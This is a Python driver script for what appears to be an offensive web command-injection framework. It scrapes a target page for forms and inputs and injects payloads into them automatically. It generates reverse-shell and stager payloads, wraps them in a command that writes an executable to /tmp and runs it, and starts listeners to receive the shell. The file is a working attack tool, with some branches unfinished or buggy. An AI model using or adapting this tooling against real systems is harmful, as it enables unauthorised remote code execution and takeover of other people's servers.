#!/usr/bin/python3

import argparse

from payloads import Monkey, Generator

from server import ReverseListener, ControlTower

import random
import string
import time
import threading
import readline
import sys
import requests

parser = argparse.ArgumentParser(description='Test')


def randword(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


def comma_separated(names):
    return names.split(',')


INJECT_SUCCESS = False

PAYLOAD_TYPES = ['shell', 'binshell', 'stager', 'custom']

STAGE_TYPES = ['bin', 'cmd']

STAGER_CONTROL_PORT = random.randint(12000, 20000)  # should this be an arg?


def on_recv(data):
    print("".join([d.decode() for d in data]))


def on_shell(addr):
    global INJECT_SUCCESS
    INJECT_SUCCESS = True


CUSTOM_NAMES = []

LISTENER = None

CONTROL_TOWER = None

URL = None

LHOST = None

LPORT = None

CHOST = None

CPORT = None

PL = None

PTYPE = None

TARGET = None

MONKEY = None

GENERATOR = None

CUSTOM_PAYLOAD = None

CUSTOM_LISTENER = None

CUSTOM_STAGE_TYPES = []

CUSTOM_STAGES = []


def ON_STAGER_CONNECT(ct):
    global INJECT_SUCCESS
    INJECT_SUCCESS = True

    # TODO we are here


def scrape():
    global URL, MONKEY

    if 'http' not in URL:
        print('scrape called but argument is not a valid url (missing http://?)')
        quit()

    MONKEY = Monkey(URL)

    forms = MONKEY.get_forms()
    inputs = MONKEY.get_inputs()
    if forms is None and inputs is None:
        print("Scrape failed. Nowhere to inject")
        exit(1)
    else:
        print('FORMS', not not forms)
        print('INPUTS', not not inputs)


def monkey_inject():
    global CUSTOM_NAMES
    global INJECT_SUCCESS
    global TARGET
    global URL
    global MONKEY
    global PL

    if not MONKEY and not not URL and not TARGET:
        print('URL present, TARGET isn\'t. Implicitly calling scrape()')
        scrape()

    if MONKEY.get_forms():
        print("Injecting via forms")
        MONKEY.autoinject_forms(PL)

    if MONKEY.get_inputs() and not INJECT_SUCCESS:
        print("Injecting with names found in inputs")
        MONKEY.autoinject_urls(PL)

    if MONKEY.get_inputs() and not INJECT_SUCCESS and (len(CUSTOM_NAMES) > 0):
        print("Injecting via endpoints with custom names")
        MONKEY.autoinject_urls(PL)


def check_LHOST_LPORT():
    global LHOST, LPORT
    if not LHOST:
        default = '127.0.0.1'
        LHOST = default
        print(f'listen() called but no LHOST specified. Using {default}')
    if not LPORT:
        default = random.randint(12000, 20000)
        LPORT = default
        print(f'listen() called but no LPORT specified. Using {default}')


def check_CHOST_CPORT():
    global CHOST, CPORT, STAGER_CONTROL_PORT
    if not CHOST:
        default = '127.0.0.1'
        CHOST = default
        print(f'control() called but no CHOST specified. Using {default}')
    if not CPORT:
        CPORT = STAGER_CONTROL_PORT
        print(f'control() called but no CPORT specified. Using {STAGER_CONTROL_PORT}')


def start_control_tower():
    global CONTROL_TOWER, CHOST, STAGER_CONTROL_PORT, ON_STAGER_CONNECT

    CONTROL_TOWER = ControlTower(ip=CHOST, port=int(STAGER_CONTROL_PORT), success_cb=ON_STAGER_CONNECT)

    CONTROL_TOWER.start()

try:
    # TODO: custom help message
    for i in range(len(sys.argv)):  # collect args
        arg = sys.argv[i]

        if arg == 'LHOST':
            LHOST = sys.argv[i + 1]

        if arg == 'LPORT':
            LPORT = sys.argv[i + 1]

        if arg == 'CHOST':
            CHOST = sys.argv[i + 1]

        if arg == 'CPORT':
            CPORT = sys.argv[i + 1]

        if arg == 'PTYPE':
            PTYPE = sys.argv[i + 1]

        if arg == 'URL':
            URL = sys.argv[i + 1]

        if arg == 'TARGET':
            TARGET = sys.argv[i + 1]

        if arg == 'CUSTOM_PAYLOAD':
            CUSTOM_PAYLOAD = sys.argv[i + 1]

        if arg == 'CUSTOM_LISTENER':
            CUSTOM_LISTENER = sys.argv[i + 1]

        if arg == 'CUSTOM_NAMES':
            CUSTOM_NAMES = comma_separated(sys.argv[i + 1])

        if arg == 'CUSTOM_STAGES':
            CUSTOM_STAGES = comma_separated(sys.argv[i + 1])

        if arg == 'CUSTOM_STAGE_TYPE':
            CUSTOM_STAGE_TYPES = comma_separated(sys.argv[i + 1])

    for i in range(len(sys.argv)):  # collect commands
        arg = sys.argv[i]

        if arg == 'generate':
            if PTYPE not in PAYLOAD_TYPES:
                print(f"generate called but argument is not one of [{', '.join(PAYLOAD_TYPES)}]")
                quit()

            check_LHOST_LPORT()

            GENERATOR = Generator(LHOST, LPORT)

            match PTYPE:
                case 'shell':
                    PL = GENERATOR.ir_shell()
                case 'binshell':
                    PL = GENERATOR.ir_bin()
                case 'stager':
                    check_CHOST_CPORT()
                    PL = Generator.bin_stager(CHOST, CPORT)
                case 'custom':
                    PL = CUSTOM_PAYLOAD

            print(PL)

        if arg == 'scrape':
            scrape()

        if arg == 'listen':
            check_LHOST_LPORT()

            LISTENER = ReverseListener(
                ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)

            LISTENER.start()

        if arg == 'inject':
            if not PTYPE:
                PTYPE = 'binshell'

            if PTYPE not in PAYLOAD_TYPES:
                print(f"inject called but argument is not one of [{', '.join(PAYLOAD_TYPES)}]")
                quit()

            if not CUSTOM_LISTENER and not LISTENER:
                check_LHOST_LPORT()

                LISTENER = ReverseListener(
                    ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)

                LISTENER.start()

            if PTYPE == 'stager':
                if len(CUSTOM_STAGES) > 0 and not CUSTOM_STAGE_TYPES:
                    print('To use custom stages, specify custom stage types:')
                    print(f'Supported types: {STAGE_TYPES}')
                    print('To inject a binary, element of CUSTOM_STAGES should be filepath to the binary and element of CUSTOM_STAGE_TYPES should be bin')
                    print('To inject a command, element of CUSTOM_STAGES should be the command and element of CUSTOM_STAGE_TYPES should be cmd')
                    quit()

                if not PL:
                    check_CHOST_CPORT()
                    PL = Generator.bin_stager(CHOST, CPORT)

                n = randword(4)
                PL = f'printf "{PL}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'

                if not CONTROL_TOWER:
                    check_CHOST_CPORT()
                    start_control_tower()

            elif PTYPE == 'binshell':
                n = randword(4)
                PL = Generator.bin_reverse_shell(LHOST, LPORT)
                PL = f'printf "{PL}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'

            if not PL:
                default = 'binshell'
                PL = Generator.bin_reverse_shell(LHOST, LPORT)
                print(f'No payload type (PTYPE) scpecified, using {default}')
                PL = f'printf "{PL}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'

            if URL:  # scrape was called
                if TARGET and 'INJECT' in TARGET:
                    print('scrape() and inject(target) cannot be called together. Choose one')
                    quit()
                monkey_inject()
            elif TARGET and 'INJECT' in TARGET:
                target = TARGET.replace('INJECT', PL)
                # TODO get request type (http, socket, etc) from args and make it here or in imported func

        if arg == 'control':
            if not CONTROL_TOWER:
                check_CHOST_CPORT()
                start_control_tower()

except KeyboardInterrupt:  # ctrl-c
    quit()
